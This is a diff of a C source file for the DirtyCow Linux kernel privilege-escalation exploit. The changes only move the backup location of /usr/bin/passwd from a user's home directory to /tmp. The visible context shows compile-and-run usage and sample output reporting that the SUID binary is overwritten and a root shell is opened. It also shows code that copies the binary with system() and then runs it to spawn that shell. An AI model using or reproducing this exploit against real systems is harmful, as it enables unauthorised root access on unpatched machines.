@@ -4,12 +4,12 @@
 * $ gcc cow.c -o cow -pthread
 * $ ./cow
 * DirtyCow root privilege escalation
-* Backing up /usr/bin/passwd.. to /home/buscamos/bak
+* Backing up /usr/bin/passwd.. to /tmp/bak
 * Size of binary: 57048
 * Racing, this may take a while..
 * /usr/bin/passwd overwritten
 * Popping root shell.
-* Don't forget to restore /home/buscamos/bak
+* Don't forget to restore /tmp/bak
 * thread stopped
 * thread stopped
 * root@box:/root/cow# id
@@ -121,7 +121,7 @@ void *waitForWrite(void *arg) {
     stop = 1;
 
     printf("Popping root shell.\n");
-    printf("Don't forget to restore /home/buscamos/bak\n");
+    printf("Don't forget to restore /tmp/bak\n");
 
     system(suid_binary);
 }
@@ -130,9 +130,9 @@ int main(int argc,char *argv[]) {
     char *backup;
 
     printf("DirtyCow root privilege escalation\n");
-    printf("Backing up %s to /home/buscamos/bak\n", suid_binary);
+    printf("Backing up %s to /tmp/bak\n", suid_binary);
 
-    asprintf(&backup, "cp %s /home/buscamos/bak", suid_binary);
+    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
     system(backup);
 
     f = open(suid_binary,O_RDONLY);
